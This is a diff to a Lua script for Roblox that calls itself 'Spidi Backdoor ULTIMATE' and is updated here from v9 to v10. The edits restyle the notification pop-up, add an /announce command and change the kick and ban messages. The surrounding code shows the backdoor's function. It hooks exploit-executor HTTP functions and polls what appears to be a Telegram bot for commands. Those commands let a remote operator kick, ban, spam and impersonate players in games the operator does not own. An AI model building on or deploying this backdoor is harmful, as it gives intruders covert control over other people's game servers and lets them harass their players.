@@ -25,6 +25,7 @@ local TextChatService = game:GetService("TextChatService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
+local TweenService = game:GetService("TweenService")
 
 local function httpRequest(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
@@ -299,7 +300,7 @@ local function unspinPlayer(target)
     return false
 end
 
-local function showNotification(target, title, text, duration)
+local function showNotification(target, text, duration)
     duration = duration or 5
     local gui = target:FindFirstChild("PlayerGui")
     if not gui then return end
@@ -310,9 +311,9 @@ local function showNotification(target, title, text, duration)
     screen.Parent = gui
     
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 400, 0, 60)
-    frame.Position = UDim2.new(0.5, -200, 0, 20)
-    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    frame.Size = UDim2.new(0, 450, 0, 50)
+    frame.Position = UDim2.new(0.5, -225, 0, 20)
+    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
     frame.BackgroundTransparency = 0.1
     frame.BorderSizePixel = 0
     frame.Parent = screen
@@ -323,37 +324,26 @@ local function showNotification(target, title, text, duration)
     
     local stroke = Instance.new("UIStroke")
     stroke.Color = Color3.fromRGB(0, 255, 0)
-    stroke.Thickness = 2
+    stroke.Thickness = 1
     stroke.Parent = frame
     
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Size = UDim2.new(1, -20, 0, 25)
-    titleLabel.Position = UDim2.new(0, 10, 0, 5)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Text = title or "Spidi Backdoor"
-    titleLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-    titleLabel.TextSize = 16
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-    titleLabel.Parent = frame
-    
     local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, -20, 0, 25)
-    textLabel.Position = UDim2.new(0, 10, 0, 28)
+    textLabel.Size = UDim2.new(1, -20, 1, 0)
+    textLabel.Position = UDim2.new(0, 10, 0, 0)
     textLabel.BackgroundTransparency = 1
     textLabel.Text = text or ""
     textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    textLabel.TextSize = 14
+    textLabel.TextSize = 16
     textLabel.Font = Enum.Font.Gotham
-    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.TextXAlignment = Enum.TextXAlignment.Center
     textLabel.TextWrapped = true
     textLabel.Parent = frame
     
     frame.BackgroundTransparency = 1
-    frame.Position = UDim2.new(0.5, -200, 0, -80)
-    game:GetService("TweenService"):Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+    frame.Position = UDim2.new(0.5, -225, 0, -80)
+    TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
         BackgroundTransparency = 0.1,
-        Position = UDim2.new(0.5, -200, 0, 20)
+        Position = UDim2.new(0.5, -225, 0, 20)
     }):Play()
     
     game:GetService("Debris"):AddItem(screen, duration)
@@ -364,12 +354,12 @@ local function handleCommand(cmd, args, username)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor ULTIMATE v9 активирован!\n"..info)
+        sendMessage("✅ Spidi Backdoor ULTIMATE v10 активирован!\n"..info)
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>КОМАНДЫ SPIDI v9:</b>\n\n"..
+        sendMessage("📋 <b>КОМАНДЫ SPIDI v10:</b>\n\n"..
             "<b>👤 ПОЛЬЗОВАТЕЛИ:</b>\n"..
             "/players - список пользователей\n"..
             "/kick [ник] [причина] - кикнуть\n"..
@@ -399,7 +389,8 @@ local function handleCommand(cmd, args, username)
             "<b>💬 ЧАТ:</b>\n"..
             "/say [ник] [текст] - сказать от имени\n"..
             "/spam [ник] [кол-во] [текст] - спам\n"..
-            "/message [ник] [текст] - сообщение\n\n"..
+            "/message [ник] [текст] - сообщение\n"..
+            "/announce [текст] - объявление\n\n"..
             "<b>📊 ИНФО:</b>\n"..
             "/players - список пользователей\n"..
             "/server - инфо о сервере\n"..
@@ -478,6 +469,23 @@ local function handleCommand(cmd, args, username)
         return
     end
     
+    -- ========== ANNOUNCE (ЧИСТОЕ ОБЪЯВЛЕНИЕ) ==========
+    if cmd == "announce" then
+        local msg = table.concat(args, " ", 1)
+        if msg == "" then
+            sendMessage("❌ /announce [текст]")
+            return
+        end
+        StarterGui:SetCore("SendNotification", {
+            Title = "",
+            Text = msg,
+            Duration = 10,
+            Icon = ""
+        })
+        sendMessage("✅ Объявление: "..msg)
+        return
+    end
+    
     -- ========== КОМАНДЫ С ВЫБОРОМ ИГРОКА ==========
     
     if cmd == "say" then
@@ -546,7 +554,7 @@ local function handleCommand(cmd, args, username)
             sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
             return
         end
-        showNotification(target, "📩 Сообщение от Spidi", msg, 6)
+        showNotification(target, msg, 5)
         sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
         return
     end
@@ -604,20 +612,22 @@ local function handleCommand(cmd, args, username)
     if cmd == "kick" then
         local reason = table.concat(args, " ", 2)
         if reason == "" or reason == name then
-            reason = "No reason"
+            target:Kick("Kicked by Spidi Backdoor")
+        else
+            target:Kick(reason)
         end
-        target:Kick("Kicked by Spidi Backdoor: "..reason)
-        sendMessage("✅ Кикнут: <b>"..target.Name.."</b> (Причина: "..reason..")")
+        sendMessage("✅ Кикнут: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
         return
     end
     
     if cmd == "ban" then
         local reason = table.concat(args, " ", 2)
         if reason == "" or reason == name then
-            reason = "No reason"
+            target:Kick("Banned by Spidi Backdoor")
+        else
+            target:Kick(reason)
         end
-        target:Kick("Banned by Spidi Backdoor: "..reason)
-        sendMessage("✅ Забанен: <b>"..target.Name.."</b> (Причина: "..reason..")")
+        sendMessage("✅ Забанен: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
         return
     end
     
@@ -834,7 +844,7 @@ local function pollUpdates()
                     local msg = update.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor ULTIMATE v9 запущен!\n👤 Hacker228")
+                        sendMessage("✅ Spidi Backdoor ULTIMATE v10 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -906,7 +916,7 @@ local function createGUI()
     title.BackgroundTransparency = 1
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
-    title.Text = "Spidi Backdoor ULTIMATE v9"
+    title.Text = "Spidi Backdoor ULTIMATE v10"
     title.TextColor3 = Color3.fromRGB(0, 255, 0)
     title.TextSize = 28
     title.Font = Enum.Font.GothamBold
@@ -993,5 +1003,5 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v9 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n🎵 /music [айди] - играть музыку")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v10 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n🎵 /music [айди] - играть музыку")
 end
